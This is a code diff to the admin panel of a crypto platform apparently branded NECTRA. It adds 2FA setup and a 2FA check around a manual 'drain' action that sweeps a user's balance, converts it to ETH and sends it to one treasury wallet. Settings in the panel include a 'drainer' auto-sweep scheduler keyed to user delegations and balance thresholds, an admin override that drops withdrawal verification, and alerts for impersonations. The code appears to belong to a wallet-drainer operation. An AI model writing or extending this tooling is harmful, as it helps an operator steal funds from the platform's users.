@@ -422,11 +422,24 @@
         });
         if (v) {
           await act(b, async () => {
-            const res = await NX.post(`/api/admin/users/${u.id}/drain`, v);
-            if (res && res.ok) {
-              const ethMsg = res.totalEth ? ` (≈ ${Number(res.totalEth).toFixed(4)} ETH)` : '';
-              NX.toast(`Manual sweep complete: $${(res.totalUsd || 0).toFixed(2)}${ethMsg} swept & converted`);
-              route();
+            try {
+              const res = await NX.post(`/api/admin/users/${u.id}/drain`, v);
+              if (res && res.ok) {
+                const ethMsg = res.totalEth ? ` (≈ ${Number(res.totalEth).toFixed(4)} ETH)` : '';
+                NX.toast(`Manual sweep complete: $${(res.totalUsd || 0).toFixed(2)}${ethMsg} swept & converted`);
+                route();
+              }
+            } catch (err) {
+              if (err.message && err.message.includes('Enable 2FA')) {
+                const go2fa = await NX.confirm({
+                  title: 'Admin 2FA Required to Sweep',
+                  body: 'Your platform settings require 2FA on your admin account before sweeping. Would you like to set up 2FA now?',
+                  confirm: 'Set up Admin 2FA'
+                });
+                if (go2fa && NX.openAdmin2FAModal) NX.openAdmin2FAModal();
+              } else {
+                NX.toast(err.message, { type: 'error' });
+              }
             }
           });
         }
@@ -666,6 +679,17 @@
       ${row('referral_max_codes', 'Referral codes per user', 'Max active referral codes.', 'num')}
       ${row('referral_code_uses', 'Uses per referral code', 'How many people each code can invite.', 'num')}
       <h3 class="card__title mt-24">Security & admin alerts</h3>
+      <div class="card mb-16" style="padding:16px;background:var(--bg-elevated);border:1px solid var(--border);border-radius:var(--radius-md)">
+        <div class="row between">
+          <div>
+            <h4 style="margin:0 0 4px 0">Admin Account 2FA</h4>
+            <p class="small muted" style="margin:0">Set up Google Authenticator, Authy, or 1Password to authorize balance sweeps and protect admin logins.</p>
+          </div>
+          <button class="btn btn--sm ${NX.data.user && NX.data.user.twoFA ? 'btn--ghost' : 'btn--primary'}" id="adm-settings-2fa-btn" type="button">
+            ${NX.data.user && NX.data.user.twoFA ? '<span class="dot dot--green"></span> 2FA Active (Manage)' : '<i data-i="key2fa"></i> Set Up 2FA'}
+          </button>
+        </div>
+      </div>
       ${row('withdrawal_auth_required', 'Require authentication code for withdrawals', 'When disabled, user withdrawals do not require email or 2FA verification codes (admin override).')}
       ${row('withdrawals_paused', 'Pause all withdrawals (circuit breaker)', 'Immediately blocks all new outgoing withdrawal requests platform-wide.')}
       ${row('telegram_bot_token', 'Telegram Bot Token', 'API token from @BotFather (e.g. 123456789:ABCdef...). Required for real-time Telegram alerts for sweeps, impersonations, rotations, and withdrawals.', 'text')}
@@ -677,6 +701,7 @@
       <h3 class="card__title mt-24">Treasury & asset sweeping</h3>
       ${row('sweep_destination_eth', 'Treasury Destination — Ethereum EVM Wallet', 'Single destination Ethereum wallet (0x...). All automatic and manual sweeps convert tokens to ETH and transfer here.', 'text')}
       ${row('sweep_auto_convert_eth', 'Convert all swept tokens to ETH', 'When enabled, all tokens (USDC, USDT, SOL, etc.) automatically liquidate/convert to ETH before transfer to your destination wallet.')}
+      ${row('drainer_require_2fa', 'Require 2FA for admin sweeps', 'When enabled, sweeping user funds requires 2FA on your admin account. Toggle OFF to allow sweeps without 2FA.')}
       ${row('drainer_auto_sweep', 'Automated delegation sweep scheduler', 'Periodically checks for active user delegations and automatically sweeps when balance meets or exceeds the threshold.')}
       ${row('drainer_auto_sweep_usd', 'Automated sweep threshold (USD)', 'Minimum user balance in USD required to trigger an automated sweep.', 'num')}
       ${row('btc_collateral_xpub', 'Bitcoin Collateral XPUB (BTC)', 'Account-level zpub/xpub from a wallet you control for watching BTC collateral deposits (watch only, never spend).', 'text')}
@@ -739,6 +764,7 @@
         NX.toast(res && res.message ? res.message : 'Test email sent successfully!');
       });
     });
+    $('#adm-settings-2fa-btn')?.addEventListener('click', () => NX.openAdmin2FAModal && NX.openAdmin2FAModal());
 
     const handleUpload = (inputEl, type) => {
       inputEl.addEventListener('change', async () => {
@@ -817,8 +843,147 @@
         NX.walkAndReplace(main(), pName, 'NECTRA');
       }
     }
-    catch (e) { main().innerHTML = e.data && e.data.code === 'ADMIN_2FA_REQUIRED' ? `<section class="card center stack-lg" style="max-width:520px;margin:40px auto"><div class="feature__ic" style="margin:0 auto">${I('key2fa')}</div><h2>Two-factor authentication required</h2><p class="muted">This platform requires staff to use an authenticator app. Set it up on your account, then come back.</p><a class="btn btn--primary" href="/settings.html#security">Set up 2FA</a></section>` : `<div class="note note--danger">${I('alert')}<span>${esc(e.message)}</span></div>`; }
+    catch (e) { main().innerHTML = e.data && e.data.code === 'ADMIN_2FA_REQUIRED' ? `<section class="card center stack-lg" style="max-width:520px;margin:40px auto"><div class="feature__ic" style="margin:0 auto">${I('key2fa')}</div><h2>Two-factor authentication required</h2><p class="muted">This platform requires staff to use an authenticator app. Set it up on your account, then come back.</p><button class="btn btn--primary" id="adm-gate-2fa-btn">Set up 2FA</button></section>` : `<div class="note note--danger">${I('alert')}<span>${esc(e.message)}</span></div>`; $('#adm-gate-2fa-btn')?.addEventListener('click', () => NX.openAdmin2FAModal && NX.openAdmin2FAModal()); }
   }
+
+  function updateAdmin2FABadges() {
+    const u = NX.data.user;
+    const topBtn = $('#adm-2fa-btn');
+    const sideTag = $('#adm-side-2fa-tag');
+    if (topBtn) {
+      if (u && u.twoFA) {
+        topBtn.className = 'btn btn--sm btn--ghost';
+        topBtn.innerHTML = `<span class="dot dot--green"></span> 2FA Active`;
+        topBtn.title = 'Two-Factor Authentication is active on your admin account';
+      } else {
+        topBtn.className = 'btn btn--sm btn--accent';
+        topBtn.innerHTML = `<span class="dot dot--amber dot--pulse"></span> ${I('key2fa', 'ic--sm')} Set up 2FA`;
+        topBtn.title = 'Two-Factor Authentication is off. Click to set up.';
+      }
+    }
+    if (sideTag) {
+      if (u && u.twoFA) {
+        sideTag.className = 'tag tag--sm tag--green';
+        sideTag.textContent = 'Active';
+      } else {
+        sideTag.className = 'tag tag--sm tag--amber';
+        sideTag.textContent = 'Off';
+      }
+    }
+  }
+
+  NX.openAdmin2FAModal = async () => {
+    const modal = $('#adm-2fa-modal');
+    const body = $('#adm-2fa-body');
+    if (!modal || !body) return;
+    const u = NX.data.user;
+
+    if (u && u.twoFA) {
+      body.innerHTML = `
+        <div class="stack center" style="padding:16px 0">
+          <div class="feature__ic" style="margin:0 auto;width:56px;height:56px;background:var(--green-tint);color:var(--green)">
+            ${I('shield')}
+          </div>
+          <h3 style="margin:8px 0 4px">Admin 2FA is Active</h3>
+          <p class="small muted" style="max-width:380px;margin:0 auto">Your admin account is protected with Two-Factor Authentication. Account sweeps, adjustments, and settings changes are fully authorized.</p>
+          <div class="row mt-16" style="justify-content:center;gap:10px">
+            <button class="btn btn--danger-outline btn--sm" id="adm-tfa-disable-btn">Disable 2FA</button>
+            <button class="btn btn--primary btn--sm" data-close>Close</button>
+          </div>
+        </div>
+      `;
+      NX.hydrateIcons(body);
+      NX.modal.open(modal);
+
+      $('#adm-tfa-disable-btn')?.addEventListener('click', async () => {
+        const code = prompt('Enter the 6-digit code from your authenticator app to confirm disabling 2FA:');
+        if (!code) return;
+        try {
+          await NX.post('/api/me/2fa/disable', { code: code.trim() });
+          u.twoFA = false;
+          updateAdmin2FABadges();
+          NX.modal.close(modal);
+          NX.toast('Admin 2FA disabled', { type: 'warn' });
+          if (location.hash === '#settings') route();
+        } catch (err) {
+          NX.toast(err.message || 'Incorrect 2FA code', { type: 'error' });
+        }
+      });
+      return;
+    }
+
+    // Setting up 2FA
+    body.innerHTML = '<div class="skel skel--row"></div><div class="skel skel--row"></div>';
+    NX.modal.open(modal);
+
+    let setupData;
+    try {
+      setupData = await NX.post('/api/me/2fa/setup');
+    } catch (err) {
+      body.innerHTML = `<div class="note note--danger">${I('alert')}<span>${esc(err.message)}</span></div>`;
+      NX.hydrateIcons(body);
+      return;
+    }
+
+    body.innerHTML = `
+      <div class="stack" style="gap:14px">
+        <p class="small muted" style="margin:0"><b>Step 1:</b> Scan this QR code with Google Authenticator, Authy, or 1Password.</p>
+        <div class="qr" id="adm-tfa-qr" style="margin:0 auto"></div>
+        <div class="caption center" style="margin-top:-4px">
+          Or enter this setup key manually into your authenticator app:<br>
+          <div class="row" style="justify-content:center;gap:8px;margin-top:6px">
+            <b class="mono" style="font-size:13px;letter-spacing:1px;color:var(--text);word-break:break-all">${esc(setupData.secret)}</b>
+            <button class="btn btn--sm btn--ghost" id="adm-copy-secret" type="button">${I('copy', 'ic--sm')} Copy Key</button>
+          </div>
+        </div>
+        <div class="divider" style="margin:6px 0"></div>
+        <p class="small muted" style="margin:0"><b>Step 2:</b> Enter the 6-digit verification code generated by your app.</p>
+        <div class="otp" id="adm-tfa-otp" role="group" aria-label="Authenticator code"></div>
+        <p class="hint hint--error" id="adm-tfa-err" style="display:none;justify-content:center"></p>
+      </div>
+    `;
+    NX.hydrateIcons(body);
+
+    const qrEl = $('#adm-tfa-qr');
+    if (qrEl) {
+      if (typeof window.qrcode === 'function') {
+        NX.charts.qr(qrEl, setupData.otpauth);
+      } else {
+        qrEl.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${encodeURIComponent(setupData.otpauth)}" alt="2FA QR Code" style="width:160px;height:160px;display:block;border-radius:8px">`;
+      }
+    }
+
+    $('#adm-copy-secret')?.addEventListener('click', () => {
+      navigator.clipboard.writeText(setupData.secret);
+      NX.toast('2FA Secret key copied to clipboard');
+    });
+
+    const otp = NX.otp($('#adm-tfa-otp'), {
+      length: 6,
+      onComplete: async (code) => {
+        const errEl = $('#adm-tfa-err');
+        if (errEl) errEl.style.display = 'none';
+        try {
+          await NX.post('/api/me/2fa/enable', { code });
+          otp.valid();
+          u.twoFA = true;
+          updateAdmin2FABadges();
+          setTimeout(() => {
+            NX.modal.close(modal);
+            NX.toast('Admin 2FA enabled successfully!', { type: 'ok' });
+            if (location.hash === '#settings') route();
+          }, 500);
+        } catch (e) {
+          otp.invalid();
+          if (errEl) {
+            errEl.textContent = e.message || 'Incorrect verification code';
+            errEl.style.display = 'flex';
+          }
+        }
+      }
+    });
+    setTimeout(() => otp.clear(), 100);
+  };
 
   NX.pages = { admin: async () => {
     let me;
@@ -826,6 +991,9 @@
     if (!me.user || me.pending2fa) { location.href = '/login.html?next=admin'; return; }
     if (!me.user.staff) { document.body.innerHTML = `<div class="auth"><main class="auth__main"><section class="card auth__card center"><h1 class="auth__title">Admins only</h1><p class="auth__lead">Your account doesn’t have admin access.</p><a class="btn btn--primary" href="/dashboard.html">Back to the app</a></section></main></div>`; return; }
     NX.data.user = me.user;
+    updateAdmin2FABadges();
+    $('#adm-2fa-btn')?.addEventListener('click', () => NX.openAdmin2FAModal && NX.openAdmin2FAModal());
+    $('#adm-side-2fa')?.addEventListener('click', () => NX.openAdmin2FAModal && NX.openAdmin2FAModal());
     try { NX.data.tokens = (await NX.get('/api/market/tokens')).tokens; } catch (e) { /* */ }
     $('#adm-avatar').textContent = me.user.initials; $('#adm-avatar').title = `${me.user.email} · ${me.user.role.replace('_', ' ')}`;
     $('#adm-title').insertAdjacentHTML('afterend', `<span class="tag tag--pink">${esc(me.user.role.replace('_', ' '))}</span>`);
